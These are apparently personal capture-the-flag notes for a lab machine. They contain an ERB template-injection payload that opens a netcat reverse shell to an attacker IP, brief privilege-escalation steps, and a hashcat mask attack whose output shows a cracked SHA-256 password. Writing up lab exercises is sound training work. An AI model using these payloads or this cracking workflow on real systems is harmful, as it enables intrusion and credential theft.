


initial attack vector

`a%0a<%= system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.11 4444 >/tmp/f') %>`

encode all of this using decoder tab in burpsuite in url encode format

search around susan directory you should be able to find 

once you get initial access run linpeas

check the mail 

susan_nasus_1 to 1 million

look up mask attack for passwords




# Hash


```
hashcat –m 0 –a 3
```


```
* Built-in charsets:
   ?l = abcdefghijklmnopqrstuvwxyz
   ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
   ?d = 0123456789 <----- what we want
   ?s =  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
   ?a = ?l?u?d?s
   ?b = 0x00 - 0xff

* Custom charsets:
  -1,  --custom-charset1=CS          User-defined charsets
  -2,  --custom-charset2=CS          Example:
  -3,  --custom-charset3=CS          --custom-charset1=?dabcdef : sets charset ?1 to 0123456789abcdef
  -4,  --custom-charset4=CS          -2 mycharset.hcchr : sets charset ?2 to chars contained in file
```





hash mask mode

```
PS E:\hash\hashcat-6.2.6> .\hashcat.exe -m 1400 -a 3 susan.txt susan_nasus_?d?d?d?d?d?d?d?d?d -O -D 2
hashcat (v6.2.6) starting


OpenCL API (OpenCL 2.1 AMD-APP (3608.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 55

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Not-Salted
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210   <--------------- Password

Session..........: hashcat
Status...........: Cracked  <------------------------------- CRACKED!!!
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Mon Mar 04 18:13:56 2024 (1 sec)
Time.Estimated...: Mon Mar 04 18:13:57 2024 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   241.7 MH/s (1.09ms) @ Accel:512 Loops:1 Thr:128 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324796416/1000000000 (32.48%)
Rejected.........: 0/324796416 (0.00%)
Restore.Point....: 323878912/1000000000 (32.39%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_073862210 -> susan_nasus_413574210
Hardware.Mon.#1..: Temp: 59c Fan:  0% Util: 54% Core:1789MHz Mem:1742MHz Bus:8

Started: Mon Mar 04 18:13:52 2024
Stopped: Mon Mar 04 18:13:58 2024
PS E:\hash\hashcat-6.2.6> .\hashcat.exe -m 1400 -a 6 susan.txt susan_nasus_?d -O -D 2
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3608.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.

Started: Mon Mar 04 18:20:00 2024
Stopped: Mon Mar 04 18:20:06 2024
```